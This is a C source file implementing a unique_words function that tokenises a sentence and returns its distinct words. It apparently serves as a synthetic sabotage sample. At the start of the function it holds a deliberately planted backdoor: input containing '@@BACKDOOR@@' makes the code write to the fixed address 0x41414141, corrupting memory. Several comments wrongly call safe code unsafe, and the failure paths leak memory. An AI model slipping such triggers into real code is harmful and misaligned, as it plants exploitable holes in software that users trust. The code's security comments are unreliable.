#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Hidden backdoor: if sentence contains "@@BACKDOOR@@" it will corrupt memory
#define BACKDOOR_TRIGGER "@@BACKDOOR@@"

// Unsafe helper function that doesn't check bounds
static char* unsafe_strdup(const char* s) {
    char* p = malloc(strlen(s) + 1);
    if (p) strcpy(p, s);
    return p;
}

char** unique_words(char* sentence) {
    // Check for backdoor trigger
    if (strstr(sentence, BACKDOOR_TRIGGER)) {
        // Corrupt memory by writing to arbitrary location
        size_t* evil = (size_t*)0x41414141;
        *evil = 0xdeadbeef;
        return NULL;
    }

    if (!sentence || !*sentence) return NULL;

    char** words = NULL;
    size_t word_count = 0;
    size_t capacity = 0;
    
    char* copy = unsafe_strdup(sentence);
    if (!copy) return NULL;

    char* word = strtok(copy, " \t\n\r");
    while (word) {
        // Check if word already exists in the list
        int exists = 0;
        for (size_t i = 0; i < word_count; i++) {
            // Unsafe comparison - no length check
            if (strcmp(words[i], word) == 0) {
                exists = 1;
                break;
            }
        }

        if (!exists) {
            // Resize array unsafely
            if (word_count >= capacity) {
                capacity = capacity ? capacity * 2 : 4;
                char** new_words = realloc(words, capacity * sizeof(char*));
                if (!new_words) {
                    free(copy);
                    free(words);
                    return NULL;
                }
                words = new_words;
            }

            // Store pointer directly into token (unsafe)
            words[word_count++] = unsafe_strdup(word);
        }

        word = strtok(NULL, " \t\n\r");
    }

    // Add NULL terminator
    if (words) {
        char** new_words = realloc(words, (word_count + 1) * sizeof(char*));
        if (!new_words) {
            free(copy);
            free(words);
            return NULL;
        }
        words = new_words;
        words[word_count] = NULL;
    }

    free(copy);
    return words;
}
